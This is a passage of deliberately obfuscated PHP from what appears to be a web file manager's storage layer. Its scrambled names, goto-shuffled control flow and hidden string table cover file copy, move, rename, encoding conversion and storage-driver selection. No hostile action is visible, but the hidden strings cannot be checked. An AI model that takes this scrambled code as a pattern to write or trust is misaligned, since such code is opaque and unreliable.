$fÇ¥õ—ØŞ×[8] || !$eãŠà÷ÑĞ) { return !1; } ignore_timeout(); goto fÜ’ßÙæØä; fİ”ªèò‚Î: Hook::trigger($fÇ¥õ—ØŞ×[73], $FÑÍ…í‚Ş‘, $CÇëÖîæ½, $dßƒ¨Ëˆæó, $eãŠà÷ÑĞ); $cñ±º°„ò‹ = self::driverIsSame($FÑÍ…í‚Ş‘, $dßƒ¨Ëˆæó); if ($cñ±º°„ò‹) { if ($døİ„³ï‡« == $fÇ¥õ—ØŞ×[484] && trim($eãŠà÷ÑĞ, $fÇ¥õ—ØŞ×[8]) == trim($dßƒ¨Ëˆæó->pathFather($CÇëÖîæ½), $fÇ¥õ—ØŞ×[8])) { return $dßƒ¨Ëˆæó->getPathOuter($CÇëÖîæ½); } if (method_exists($dßƒ¨Ëˆæó, $døİ„³ï‡«)) { return $dßƒ¨Ëˆæó->{$døİ„³ï‡«}($CÇëÖîæ½, $eãŠà÷ÑĞ, $Eğß‚ôº¤); } } goto DÔ¢·Æ§‡; fÜ’ßÙæØä: $FÑÍ…í‚Ş‘ = self::driverMake($CÇëÖîæ½); $dßƒ¨Ëˆæó = self::driverMake($eãŠà÷ÑĞ); $c©Š¡‹Èñ = $døİ„³ï‡« == $fÇ¥õ—ØŞ×[484]; goto fâîÂ£Ã¿; A¡Û•›ÉÁ©: } private static function check($C”¸êÙ‹çÈ, $f¿ºÀÎŸ“, $Cè¦Å¶•·, &$EîË·ÔÂŞ–) { $FÉõÊÙïù‚ =& $_SERVER[¿õñ]; if (self::driverIsSame($C”¸êÙ‹çÈ, $Cè¦Å¶•·) && $C”¸êÙ‹çÈ->isFolder($f¿ºÀÎŸ“) && $C”¸êÙ‹çÈ->isParentOf($f¿ºÀÎŸ“, $EîË·ÔÂŞ–)) { show_json(LNG($FÉõÊÙïù‚[982]), !1); } if (!$C”¸êÙ‹çÈ->exist($f¿ºÀÎŸ“)) { show_json(LNG($FÉõÊÙïù‚[101]), !1); } } private static function copyPath($FËÌˆ¡Òƒæ, $C‚’Şèİ¹Ó, $BÅô’Õñë“, $A¤„×À»’•, $aèõõƒŠ×¾, $Aµ£Ú«¹ÅŸ, $AÚ»‘õîœ¹, $fšç“ÉĞáº = false) { goto fÛ«ìÎÃÄ; F˜„¦¢ºŸƒ: if ($AÚ»‘õîœ¹) { return self::copyFile($FËÌˆ¡Òƒæ, $C‚’Şèİ¹Ó, $BÅô’Õñë“, $A¤„×À»’•, $aÙ½†ä¥¤, $Aµ£Ú«¹ÅŸ); } if ($aèõõƒŠ×¾ == REPEAT_RENAME_FOLDER) { $aèõõƒŠ×¾ = !1; } $B“ÃğÓæ¾à = rtrim($A¤„×À»’•, $A°ÁùµÏä¿[8]) . $A°ÁùµÏä¿[8] . $aÙ½†ä¥¤; goto f‘¯†îƒ‹¢; f‘¯†îƒ‹¢: $BÌÕ®„ŸÖŸ = $BÅô’Õñë“->mkdir($BÅô’Õñë“->getPath($B“ÃğÓæ¾à)); $A¤„×À»’• = $BÅô’Õñë“->getPathInner($BÌÕ®„ŸÖŸ); $bÂëŠ–…ùÂ = $FËÌˆ¡Òƒæ->listPath($C‚’Şèİ¹Ó, !0); goto Bğ­æïÈ¥; fÛ«ìÎÃÄ: $A°ÁùµÏä¿ =& $_SERVER[¿õñ]; $aÙ½†ä¥¤ = $fšç“ÉĞáº ? $fšç“ÉĞáº : $FËÌˆ¡Òƒæ->getPathName($FËÌˆ¡Òƒæ->pathThis($C‚’Şèİ¹Ó)); if ($aèõõƒŠ×¾) { $b¦œ­”šæ¼ = $BÅô’Õñë“->fileNameExist($A¤„×À»’•, $aÙ½†ä¥¤); $aÙ½†ä¥¤ = $BÅô’Õñë“->fileNameAuto($A¤„×À»’•, $aÙ½†ä¥¤, $aèõõƒŠ×¾, !$AÚ»‘õîœ¹); $aèõõƒŠ×¾ = $b¦œ­”šæ¼ ? $aèõõƒŠ×¾ : !1; } goto F˜„¦¢ºŸƒ; Bğ­æïÈ¥: $bÎÏÄ™‡é = array_merge($bÂëŠ–…ùÂ[$A°ÁùµÏä¿[74]], $bÂëŠ–…ùÂ[$A°ÁùµÏä¿[75]]); foreach ($bÎÏÄ™‡é as $e„±™Ã×¯Á) { $aù—Õç‘Ìï = $e„±™Ã×¯Á[$A°ÁùµÏä¿[29]] == $A°ÁùµÏä¿[164]; $C‚’Şèİ¹Ó = $FËÌˆ¡Òƒæ->getPathInner($e„±™Ã×¯Á[$A°ÁùµÏä¿[76]]); $dŞ÷ÏëÛ = self::copyPath($FËÌˆ¡Òƒæ, $C‚’Şèİ¹Ó, $BÅô’Õñë“, $A¤„×À»’•, $aèõõƒŠ×¾, $Aµ£Ú«¹ÅŸ, $aù—Õç‘Ìï); if (!$dŞ÷ÏëÛ) { write_log($A°ÁùµÏä¿[983] . $C‚’Şèİ¹Ó . $A°ÁùµÏä¿[984] . $A¤„×À»’•, $A°ÁùµÏä¿[985]); } } return $BÌÕ®„ŸÖŸ; goto dÚÎë˜¿µª; dÚÎë˜¿µª: } private static function copyFile($eö¤èØÙÕ, $E¯ŠëÔ³«, $C¤Ì Äº”, $fÖ‹´Ä…Õ, $e·í „Œ£, $eµçİÛŒÒ¦) { goto D£í¥Æß¼; DÊ¸Óø¨‚: mk_dir($cßÊ°Œˆ˜¯); $C„˜ÕÂ¿î = $cßÊ°Œˆ˜¯ . $a­«·«Ğ¨ò; $C„˜ÕÂ¿î = $eö¤èØÙÕ->download($E¯ŠëÔ³«, $C„˜ÕÂ¿î); goto d¥›Ü’ªÏÎ; d¥›Ü’ªÏÎ: $C„˜ÕÂ¿î = $eö¤èØÙÕ->iconvApp($C„˜ÕÂ¿î); $C×ÒŸË¦¥å = $C¤Ì Äº”->upload($fÖ‹´Ä…Õ, $C„˜ÕÂ¿î, $eµçİÛŒÒ¦); self::remove($cßÊ°Œˆ˜¯ . $a­«·«Ğ¨ò); goto aËÎÅäò¡Ó; D£í¥Æß¼: $D¢òØªÆ¤„ =& $_SERVER[¿õñ]; $fÖ‹´Ä…Õ = $C¤Ì Äº”->getPath(rtrim($fÖ‹´Ä…Õ, $D¢òØªÆ¤„[8]) . $D¢òØªÆ¤„[8] . $e·í „Œ£); $a­«·«Ğ¨ò = $D¢òØªÆ¤„[986] . time() . rand_string(5); goto FÈ÷×öÆê™; FÈ÷×öÆê™: Hook::trigger($D¢òØªÆ¤„[987], $eö¤èØÙÕ, $E¯ŠëÔ³«, $C¤Ì Äº”, $fÖ‹´Ä…Õ, $e·í „Œ£, $a­«·«Ğ¨ò); if (self::driverIsSame($eö¤èØÙÕ, $C¤Ì Äº”)) { if ($eµçİÛŒÒ¦) { $C×ÒŸË¦¥å = $C¤Ì Äº”->moveFile($E¯ŠëÔ³«, $fÖ‹´Ä…Õ); } else { $C×ÒŸË¦¥å = $C¤Ì Äº”->copyFile($E¯ŠëÔ³«, $fÖ‹´Ä…Õ); } Hook::trigger($D¢òØªÆ¤„[988], $eö¤èØÙÕ, $E¯ŠëÔ³«, $C¤Ì Äº”, $fÖ‹´Ä…Õ, $e·í „Œ£, $C×ÒŸË¦¥å); return $C×ÒŸË¦¥å; } $cßÊ°Œˆ˜¯ = TEMP_FILES; goto DÊ¸Óø¨‚; aËÎÅäò¡Ó: Hook::trigger($D¢òØªÆ¤„[988], $eö¤èØÙÕ, $E¯ŠëÔ³«, $C¤Ì Äº”, $fÖ‹´Ä…Õ, $e·í „Œ£, $C×ÒŸË¦¥å); return $C×ÒŸË¦¥å; goto F“¹ŠÁæô; F“¹ŠÁæô: } public static function pathFather($C‡•‚äò¶Ä) { $d˜£ŠÕ´‚½ = IO::init($C‡•‚äò¶Ä); $D¸‚ˆï¼´× = $d˜£ŠÕ´‚½->pathFather($d˜£ŠÕ´‚½->path); return $d˜£ŠÕ´‚½->getPathOuter($D¸‚ˆï¼´×); } public static function fileOut($EÊ‹íù†Ç³, $fÉ˜—×–óİ = false, $f‚‡İîºçğ = false, $A“ÆÀ˜×ê = '') { $d˜ÏŠµÈÆ’ =& $_SERVER[¿õñ]; $a‡¾™¦İ = self::driverMake($EÊ‹íù†Ç³); if ($GLOBALS[$d˜ÏŠµÈÆ’[6]][$d˜ÏŠµÈÆ’[84]][$d˜ÏŠµÈÆ’[989]]) { return $a‡¾™¦İ->fileOutServer($EÊ‹íù†Ç³, $fÉ˜—×–óİ, $f‚‡İîºçğ, $A“ÆÀ˜×ê); } return $a‡¾™¦İ->fileOut($EÊ‹íù†Ç³, $fÉ˜—×–óİ, $f‚‡İîºçğ, $A“ÆÀ˜×ê); } public static function fileOutImage($eÚƒ…òŞ, $A‰öˆãÉ = 250) { $cïãØÚÈˆì =& $_SERVER[¿õñ]; $d´èŞ ‹Àº = array(250, 1200, 3000); for ($d„±ƒ¸Ó• = 0; $d„±ƒ¸Ó• < count($d´èŞ ‹Àº); $d„±ƒ¸Ó•++) { if ($d„±ƒ¸Ó• == 0 && $A‰öˆãÉ <= $d´èŞ ‹Àº[$d„±ƒ¸Ó•]) { $A‰öˆãÉ = $d´èŞ ‹Àº[$d„±ƒ¸Ó•]; break; } else { if ($A‰öˆãÉ > $d´èŞ ‹Àº[$d„±ƒ¸Ó• - 1] && $A‰öˆãÉ <= $d´èŞ ‹Àº[$d„±ƒ¸Ó•]) { $A‰öˆãÉ = $d´èŞ ‹Àº[$d„±ƒ¸Ó•]; break; } else { if ($d„±ƒ¸Ó• == count($d´èŞ ‹Àº) - 1 && $A‰öˆãÉ > $d´èŞ ‹Àº[$d„±ƒ¸Ó•]) { $A‰öˆãÉ = $d´èŞ ‹Àº[$d„±ƒ¸Ó•]; break; } } } } $dÑÀ­ßÒğİ = self::driverMake($eÚƒ…òŞ); if ($GLOBALS[$cïãØÚÈˆì[6]][$cïãØÚÈˆì[84]][$cïãØÚÈˆì[989]]) { return $dÑÀ­ßÒğİ->fileOutImageServer($eÚƒ…òŞ, $A‰öˆãÉ); } return $dÑÀ­ßÒğİ->fileOutImage($eÚƒ…òŞ, $A‰öˆãÉ); } private static function driverIsSame($A‚í¤‰àœÒ, $f‡ÀÅÖµñò) { goto C¡ÒÚ›•®È; cªö«­Æª´: if ($a§â‹ğİ›ª != $cî Î¸©‡ƒ) { return !1; } if ($a§â‹ğİ›ª == $DÕîŸßÏô¿[691]) { return !0; } if ($a§â‹ğİ›ª == $DÕîŸßÏô¿[102]) { return !0; } goto bĞ´î½‰Â­; C¡ÒÚ›•®È: $DÕîŸßÏô¿ =& $_SERVER[¿õñ]; $a§â‹ğİ›ª = $A‚í¤‰àœÒ->getType(); $cî Î¸©‡ƒ = $f‡ÀÅÖµñò->getType(); goto cªö«­Æª´; bĞ´î½‰Â­: if ($A‚í¤‰àœÒ->pathDriver == $f‡ÀÅÖµñò->pathDriver) { return !0; } return !1; goto cåºÛÕÒƒ; cåºÛÕÒƒ: } public static function copyUpdate($F‚ÈÕÃ·­’, $BØÁâéŠÇ) { goto fÜŠ»’ˆ×; FâªÁÉ…§: Hook::trigger($fÀ¤¯ó¢Œœ[993], $F‚ÈÕÃ·­’, $BØÁâéŠÇ, $eòÉô¦èŸ); foreach ($bŠöá¾È as $C£ÙªÜŞ) { IO::mkdir($C£ÙªÜŞ); } foreach ($cÒôÙ–«Ÿö as $C£ÙªÜŞ) { IO::copy($C£ÙªÜŞ[$fÀ¤¯ó¢Œœ[990]], $C£ÙªÜŞ[$fÀ¤¯ó¢Œœ[991]], REPEAT_REPLACE); } goto b—‘‚ŠÑö¯; fÜŠ»’ˆ×: $fÀ¤¯ó¢Œœ =& $_SERVER[¿õñ]; if (!IO::exist($F‚ÈÕÃ·­’)) { return !1; } if (!IO::exist($BØÁâéŠÇ)) { IO::mkdir($BØÁâéŠÇ); } goto C¼¥ÈŸÌ­à; C¼¥ÈŸÌ­à: $D¸¸å–ƒÚö = self::_listAll($F‚ÈÕÃ·­’); $e Øœİ¦ÍÈ = self::_listAll($BØÁâéŠÇ); $cÒôÙ–«Ÿö = array(); goto FŸ¶¶¸Ó ; FŸ¶¶¸Ó : $bŠöá¾È = array(); foreach ($D¸¸å–ƒÚö as $DØÃ‘‘öÛª => $C£ÙªÜŞ) { if ($C£ÙªÜŞ[$fÀ¤¯ó¢Œœ[77]] == 1 && !isset($e Øœİ¦ÍÈ[$DØÃ‘‘öÛª])) { $bŠöá¾È[] = $BØÁâéŠÇ . $fÀ¤¯ó¢Œœ[8] . $DØÃ‘‘öÛª; } if ($C£ÙªÜŞ[$fÀ¤¯ó¢Œœ[77]] == 0) { if (!isset($e Øœİ¦ÍÈ[$DØÃ‘‘öÛª]) || $e Øœİ¦ÍÈ[$DØÃ‘‘öÛª][$fÀ¤¯ó¢Œœ[78]] != $C£ÙªÜŞ[$fÀ¤¯ó¢Œœ[78]]) { $cÒôÙ–«Ÿö[] = array($fÀ¤¯ó¢Œœ[990] => $C£ÙªÜŞ[$fÀ¤¯ó¢Œœ[76]], $fÀ¤¯ó¢Œœ[991] => $BØÁâéŠÇ . $fÀ¤¯ó¢Œœ[8] . get_path_father($DØÃ‘‘öÛª), $fÀ¤¯ó¢Œœ[992] => $C£ÙªÜŞ); if (isset($e Øœİ¦ÍÈ[$DØÃ‘‘öÛª])) { IO::remove($BØÁâéŠÇ . $fÀ¤¯ó¢Œœ[8] . $DØÃ‘‘öÛª); } } } } $eòÉô¦èŸ = array($fÀ¤¯ó¢Œœ[164] => $cÒôÙ–«Ÿö, $fÀ¤¯ó¢Œœ[77] => $bŠöá¾È); goto FâªÁÉ…§; b—‘‚ŠÑö¯: } private static function _listAll($E¯…‰ò¡‚Ì) { $B³†ğˆËàå =& $_SERVER[¿õñ]; $E¯…‰ò¡‚Ì = KodIO::clear($E¯…‰ò¡‚Ì); $dÑãˆäîÁÎ = IO::listAll($E¯…‰ò¡‚Ì); foreach ($dÑãˆäîÁÎ as &$b±¯‚®¾ŸÊ) { $bçµŸç¦ÃË = substr($b±¯‚®¾ŸÊ[$B³†ğˆËàå[76]], strlen($E¯…‰ò¡‚Ì)); $b±¯‚®¾ŸÊ[$B³†ğˆËàå[994]] = trim($bçµŸç¦ÃË, $B³†ğˆËàå[8]); } return array_to_keyvalue($dÑãˆäîÁÎ, $B³†ğˆËàå[994]); } public static function fileSubstr($E†¹¡°§Œ, $c¸Éµ‘áõË, $DÆè´ÁğõÛ = false) { goto DÓ™“ñ‹å»; d½ĞêŸõ´™: if ($c¸Éµ‘áõË + $DÆè´ÁğõÛ > $AÜé‘İŠè) { $DÆè´ÁğõÛ = $AÜé‘İŠè - $c¸Éµ‘áõË; } if ($DÆè´ÁğõÛ <= 0) { return $_SERVER[¿õñ][33]; } if ($c¸Éµ‘áõË < 0 || $c¸Éµ‘áõË >= $AÜé‘İŠè || $DÆè´ÁğõÛ > 1024 * 1024 * 5) { throw new Exception("\146\151\154\x65\x52\145\141\x64\40\x65\162\x72\x6f\x72\x21\x20\163\x74\141\162\164\75{$c¸Éµ‘áõË}\x3b\154\x65\156\x67\164\150\75{$DÆè´ÁğõÛ}\73\40\x73\x69\172\145\x3d{$AÜé‘İŠè}\x3b"); } goto Bàí‘¼‰¶’; Bàí‘¼‰¶’: return $D®¼Å·æ»É->fileSubstr($E†¹¡°§Œ, $c¸Éµ‘áõË, $DÆè´ÁğõÛ); goto a¯¿½Öàª; D…ÁïÃŒ½¢: $AêöÜØ¶í“ = $DÆè´ÁğõÛ; if ($c¸Éµ‘áõË < 0) { $c¸Éµ‘áõË = $AÜé‘İŠè + $c¸Éµ‘áõË; } if ($DÆè´ÁğõÛ === !1) { $DÆè´ÁğõÛ = $AÜé‘İŠè - $c¸Éµ‘áõË; } goto d½ĞêŸõ´™; DÓ™“ñ‹å»: $D®¼Å·æ»É = self::driverMake($E†¹¡°§Œ); $AÜé‘İŠè = $D®¼Å·æ»É->size($E†¹¡°§Œ); $C·İ†òÔÒğ = $c¸Éµ‘áõË; goto D…ÁïÃŒ½¢; a¯¿½Öàª: } private static function driverMake(&$B«ÁÀ‹âíœ) { goto FŸ¨›Á°’; FŸ¨›Á°’: $eç›õÉÆ– =& $_SERVER[¿õñ]; $B‚š‹ë½— = KodIO::parse($B«ÁÀ‹âíœ); if (!self::$driverListSystem) { $FŠºÔİÌŒ´ = Model($eç›õÉÆ–[701])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($FŠºÔİÌŒ´, $eç›õÉÆ–[364]); } goto DŸ—ïÔßªµ; DŸ—ïÔßªµ: if ($B‚š‹ë½—[$eç›õÉÆ–[29]] == KodIO::KOD_IO && !self::$driverListSystem[$B‚š‹ë½—[$eç›õÉÆ–[364]]]) { return !1; } $B«ÁÀ‹âíœ = $B‚š‹ë½—[$eç›õÉÆ–[995]]; $AŠâİèí‰ = self::driverGet($B‚š‹ë½—, $B«ÁÀ‹âíœ); goto FµÜ×Ôæêƒ; FµÜ×Ôæêƒ: return $AŠâİèí‰; goto Aõ…ƒ„ì; Aõ…ƒ„ì: } private static function driverGet($Aß¾´£Ğ‰·, &$dÇÒªœÅÒ–) { goto C–´„’·¸Ã; e²ÒºŸö“×: $E»¿Ì¢‘Åö = self::$driverCache[$AÕÔ×¸äŒ]; $E»¿Ì¢‘Åö->pathDriver = $cø•¬¥¨‚; $E»¿Ì¢‘Åö->pathBase = $aáàÙ•á‘À[33]; goto A¯Åë‚Íâ†; Dóë²¡å: $E»¿Ì¢‘Åö->path = $dÇÒªœÅÒ–; return $E»¿Ì¢‘Åö; goto b¶ó™¤´‹Í; E†Êƒ¼ºÜÂ: switch ($Aß¾´£Ğ‰·[$aáàÙ•á‘À[29]]) { case KodIO::KOD_IO: $a”á¼ğÑ’¼ = self::$driverListSystem[$e’êÂšö©Â]; break; case KodIO::KOD_SOURCE: $dÇÒªœÅÒ– = $e’êÂšö©Â . $dÇÒªœÅÒ–; $a”á¼ğÑ’¼ = array($aáàÙ•á‘À[997] => $aáàÙ•á‘À[998], $aáàÙ•á‘À[6] => $Aß¾´£Ğ‰·); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $CáÕ©¶‰” = $GLOBALS[$aáàÙ•á‘À[999]]; self::$driverListUser = array_to_keyvalue($CáÕ©¶‰”, $aáàÙ•á‘À[364]); } $a”á¼ğÑ’¼ = self::$driverListUser[$e’êÂšö©Â]; break; case KodIO::KOD_SHARE_LINK: $a”á¼ğÑ’¼ = array($aáàÙ•á‘À[997] => $aáàÙ•á‘À[1000], $aáàÙ•á‘À[6] => $Aß¾´£Ğ‰·); $aÒñ¬™Õğ… = Action($aáàÙ•á‘À[1001])->sharePathInfo($Aß¾´£Ğ‰·[$aáàÙ•á‘À[76]]); $dÇÒªœÅÒ– = $aÒñ¬™Õğ…[$aáàÙ•á‘À[366]]; if (!$aÒñ¬™Õğ…[$aáàÙ•á‘À[366]]) { $c‡óšáä‹ = Model($aáàÙ•á‘À[528])->getInfo($aÒñ¬™Õğ…[$aáàÙ•á‘À[437]]); $dÇÒªœÅÒ– = KodIO::clear($c‡óšáä‹[$aáàÙ•á‘À[1002]] . $Aß¾´£Ğ‰·[$aáàÙ•á‘À[995]]); $Aß¾´£Ğ‰·[$aáàÙ•á‘À[435]] = $c‡óšáä‹; $Aß¾´£Ğ‰·[$aáàÙ•á‘À[981]] = $dÇÒªœÅÒ–; $a”á¼ğÑ’¼ = array($aáàÙ•á‘À[997] => $aáàÙ•á‘À[1003], $aáàÙ•á‘À[6] => $Aß¾´£Ğ‰·); } break; case KodIO::KOD_SHARE_ITEM: $a”á¼ğÑ’¼ = array($aáàÙ•á‘À[997] => $aáàÙ•á‘À[1004], $aáàÙ•á‘À[6] => $Aß¾´£Ğ‰·); $c‡óšáä‹ = Model($aáàÙ•á‘À[528])->getInfo($Aß¾´£Ğ‰·[$aáàÙ•á‘À[364]]); if ($c‡óšáä‹[$aáàÙ•á‘À[366]] == $aáàÙ•á‘À[464]) { $dÇÒªœÅÒ– = KodIO::clear($c‡óšáä‹[$aáàÙ•á‘À[1002]] . $Aß¾´£Ğ‰·[$aáàÙ•á‘À[995]]); $Aß¾´£Ğ‰·[$aáàÙ•á‘À[435]] = $c‡óšáä‹; $Aß¾´£Ğ‰·[$aáàÙ•á‘À[981]] = $dÇÒªœÅÒ–; $a”á¼ğÑ’¼ = array($aáàÙ•á‘À[997] => $aáàÙ•á‘À[1005], $aáàÙ•á‘À[6] => $Aß¾´£Ğ‰·); } break; default: $dÇÒªœÅÒ– = $Aß¾´£Ğ‰·[$aáàÙ•á‘À[76]]; $a”á¼ğÑ’¼ = array($aáàÙ•á‘À[997] => $aáàÙ•á‘À[1006]); break; } $AÕÔ×¸äŒ = $Aß¾´£Ğ‰·[$aáàÙ•á‘À[76]]; if (!isset(self::$driverCache[$AÕÔ×¸äŒ])) { $e¥¯í²›³Ÿ = $aáàÙ•á‘À[72] . self::driverType($a”á¼ğÑ’¼[$aáàÙ•á‘À[89]]); if (!class_exists($e¥¯í²›³Ÿ)) { show_json("{$e¥¯í²›³Ÿ}\40\156\157\164\40\x65\170\x69\x73\x74\x73\41", !1); } $D§óº“’ç­ = isset($a”á¼ğÑ’¼[$aáàÙ•á‘À[6]]) ? $a”á¼ğÑ’¼[$aáàÙ•á‘À[6]] : !1; self::$driverCache[$AÕÔ×¸äŒ] = new $e¥¯í²›³Ÿ($D§óº“’ç­); } goto e²ÒºŸö“×; C–´„’·¸Ã: $aáàÙ•á‘À =& $_SERVER[¿õñ]; $cø•¬¥¨‚ = $Aß¾´£Ğ‰·[$aáàÙ•á‘À[996]]; $e’êÂšö©Â = $Aß¾´£Ğ‰·[$aáàÙ•á‘À[364]]; goto E†Êƒ¼ºÜÂ; A¯Åë‚Íâ†: if (isset($a”á¼ğÑ’¼[$aáàÙ•á‘À[6]][$aáàÙ•á‘À[1007]])) { $E»¿Ì¢‘Åö->pathBase = rtrim($a”á¼ğÑ’¼[$aáàÙ•á‘À[6]][$aáàÙ•á‘À[1007]], $aáàÙ•á‘À[8]) . $aáàÙ•á‘À[8]; $dÇÒªœÅÒ– = $E»¿Ì¢‘Åö->pathBase . ltrim($dÇÒªœÅÒ–, $aáàÙ•á‘À[8]); } $dÇÒªœÅÒ– = $E»¿Ì¢‘Åö->getPath($dÇÒªœÅÒ–); if (isset($Aß¾´£Ğ‰·[$aáàÙ•á‘À[981]])) { $dÇÒªœÅÒ– = $Aß¾´£Ğ‰·[$aáàÙ•á‘À[981]]; } goto Dóë²¡å; b¶ó™¤´‹Í: } private static function driverType($e¸¢¥Í¸­) { $E«”˜¸ĞÀ¯ =& $_SERVER[¿õñ]; $e¸¢¥Í¸­ = strtolower($e¸¢¥Í¸­); if ($e¸¢¥Í¸­ == $E«”˜¸ĞÀ¯[65]) { $e¸¢¥Í¸­ = $E«”˜¸ĞÀ¯[1008]; } else { if (in_array($e¸¢¥Í¸­, array($E«”˜¸ĞÀ¯[102], $E«”˜¸ĞÀ¯[58], $E«”˜¸ĞÀ¯[1009]))) { $e¸¢¥Í¸­ = ucfirst($e¸¢¥Í¸­); } else { $e¸¢¥Í¸­ = strtoupper($e¸¢¥Í¸­); } } return $e¸¢¥Í¸­; } } goto E¨¬ª÷Ò¹; eŸ²³ˆĞ×¡: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $b¤—•¯Ş° =& $_SERVER[¿õñ]; $this->objectDriver = array($b¤—•¯Ş°[57], $b¤—•¯Ş°[58], $b¤—•¯Ş°[59], $b¤—•¯Ş°[60], $b¤—•¯Ş°[61], $b¤—•¯Ş°[62], $b¤—•¯Ş°[63], $b¤—•¯Ş°[64], $b¤—•¯Ş°[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($CÄ¿’¢ºìõ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($CÄ¿’¢ºìõ, $_SERVER[¿õñ][8]); } return $CÄ¿’¢ºìõ; } public function getPathName($ağ…Ì‚·‡­) { return $ağ…Ì‚·‡­; } public function iconvApp($bçØ‰¿º¨) { return $bçØ‰¿º¨; } public function iconvSystem($DÄÓÁ‚÷†…) { return $DÄÓÁ‚÷†…; } public function iconvTo($C¥ïÄ¤È, $bµ„ ÆÄ¶‘, $b×Ô˜…”¾ ) { goto CÙÇƒ…ŠÅ‹; cöŠØóôæ: $CËÂ¶³İ¸ = $CËÂ¶³İ¸ ? $CËÂ¶³İ¸ : $C¥ïÄ¤È; if (strstr($CËÂ¶³İ¸, $F³”Û›ØØ[70])) { $CËÂ¶³İ¸ = str_replace($F³”Û›ØØ[70], $F³”Û›ØØ[71], $CËÂ¶³İ¸); } $f×Í–Ô‡ÛÄ[$bµ„ ÆÄ¶‘ . $F³”Û›ØØ[67] . $b×Ô˜…”¾  . $F³”Û›ØØ[68] . $C¥ïÄ¤È] = $CËÂ¶³İ¸; goto dÔËàÍ¶ó; CÙÇƒ…ŠÅ‹: $F³”Û›ØØ =& $_SERVER[¿õñ]; if (!$C¥ïÄ¤È || !function_exists($F³”Û›ØØ[66])) { return $C¥ïÄ¤È; } static $f×Í–Ô‡ÛÄ = array(); goto c±›³ÌĞå; c±›³ÌĞå: $Aà¼£¶¬™ = $bµ„ ÆÄ¶‘ . $F³”Û›ØØ[67] . $b×Ô˜…”¾  . $F³”Û›ØØ[68] . $C¥ïÄ¤È; if (isset($f×Í–Ô‡ÛÄ[$Aà¼£¶¬™])) { return $f×Í–Ô‡ÛÄ[$Aà¼£¶¬™]; } if (function_exists($F³”Û›ØØ[69])) { $CËÂ¶³İ¸ = @mb_convert_encoding($C¥ïÄ¤È, $b×Ô˜…”¾ , $bµ„ ÆÄ¶‘); } else { $CËÂ¶³İ¸ = @iconv($bµ„ ÆÄ¶‘, $b×Ô˜…”¾ , $C¥ïÄ¤È); } goto cöŠØóôæ; dÔËàÍ¶ó: $f×Í–Ô‡ÛÄ[$b×Ô˜…”¾  . $F³”Û›ØØ[67] . $bµ„ ÆÄ¶‘ . $F³”Û›ØØ[68] . $C¥ïÄ¤È] = $C¥ïÄ¤È; $f×Í–Ô‡ÛÄ[$b×Ô˜…”¾  . $F³”Û›ØØ[67] . $bµ„ ÆÄ¶‘ . $F³”Û›ØØ[68] . $CËÂ¶³İ¸] = $C¥ïÄ¤È; $f×Í–Ô‡ÛÄ[$bµ„ ÆÄ¶‘ . $F³”Û›ØØ[67] . $b×Ô˜…”¾  . $F³”Û›ØØ[68] . $CËÂ¶³İ¸] = $CËÂ¶³İ¸; goto c‚Ù•‰ƒÓ¸; c‚Ù•‰ƒÓ¸: return $CËÂ¶³İ¸; goto DĞ¯£¶áƒ; DĞ¯£¶áƒ: } public function getPathInner($e«ÏÉ¹ñ) { $Bë¡°òÓ = IO::init($e«ÏÉ¹ñ); return $Bë¡°òÓ->path; } public function getPathOuter($DîËå¡¿ÖÑ) { $A×´ÑÙ•À¥ =& $_SERVER[¿õñ]; $E®…ÒëŸå = strlen(trim($this->pathBase, $A×´ÑÙ•À¥[8])); $DîËå¡¿ÖÑ = substr(trim($DîËå¡¿ÖÑ, $A×´ÑÙ•À¥[8]), $E®…ÒëŸå); return $this->pathDriver . $A×´ÑÙ•À¥[8] . ltrim($DîËå¡¿ÖÑ, $A×´ÑÙ•À¥[8]); } public function isParentOf($eŸöˆ÷•ì, $EˆÑà¨ºÉ³) { $C”é³”·ö¢ =& $_SERVER[¿õñ]; $eŸöˆ÷•ì = rtrim(strtolower($eŸöˆ÷•ì), $C”é³”·ö¢[8]) . $C”é³”·ö¢[8]; $EˆÑà¨ºÉ³ = rtrim(strtolower($EˆÑà¨ºÉ³), $C”é³”·ö¢[8]) . $C”é³”·ö¢[8]; $Fô„Ùø¼ê… = strpos($EˆÑà¨ºÉ³, $eŸöˆ÷•ì) === 0; return $Fô„Ùø¼ê…; } public function getType() { $c®ãï ´Áë =& $_SERVER[¿õñ]; $b­®…ª‚‰² = str_replace($c®ãï ´Áë[72], $c®ãï ´Áë[33], get_class($this)); return strtolower($b­®…ª‚‰²); } public function isTypeObject() { return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($aÂË°ÚÓí, $A¾óŸ¦Ì¥ì) { $dÙíùª‹¬ =& $_SERVER[¿õñ]; $AÙñ¤ØØ«ö = rtrim($aÂË°ÚÓí, $dÙíùª‹¬[8]) . $dÙíùª‹¬[8] . $A¾óŸ¦Ì¥ì; $DÂ³‚‰±ƒ = $this->exist($AÙñ¤ØØ«ö); return $DÂ³‚‰±ƒ ? $AÙñ¤ØØ«ö : !1; } public function renameObject($EƒóŒ‡Æ¸, $bƒ¾ˆİ¸’§) { $C’±êŸ‡¢˜ =& $_SERVER[¿õñ]; Hook::trigger($C’±êŸ‡¢˜[73], $this, $EƒóŒ‡Æ¸, $this, $this->pathFather($EƒóŒ‡Æ¸) . $bƒ¾ˆİ¸’§); $EƒóŒ‡Æ¸ = $this->getPathOuter($EƒóŒ‡Æ¸); $bƒ¾ˆİ¸’§ = $this->pathFather($EƒóŒ‡Æ¸) . $bƒ¾ˆİ¸’§; if (IO::isFile($EƒóŒ‡Æ¸)) { $e»Í´‹èÌæ = IO::move($EƒóŒ‡Æ¸, $bƒ¾ˆİ¸’§, REPEAT_RENAME_FOLDER); } else { $e»Í´‹èÌæ = IO::mkdir($bƒ¾ˆİ¸’§); if (!$e»Í´‹èÌæ) { return !1; } $A¬¼„‹ó‚Ğ = IO::listPath($EƒóŒ‡Æ¸, !0); $dé‡‡—² = array_merge($A¬¼„‹ó‚Ğ[$C’±êŸ‡¢˜[74]], $A¬¼„‹ó‚Ğ[$C’±êŸ‡¢˜[75]]); foreach ($dé‡‡—² as $A‰¦ğ¿ùÆ) { IO::move($A‰¦ğ¿ùÆ[$C’±êŸ‡¢˜[76]], $bƒ¾ˆİ¸’§, REPEAT_RENAME_FOLDER); } 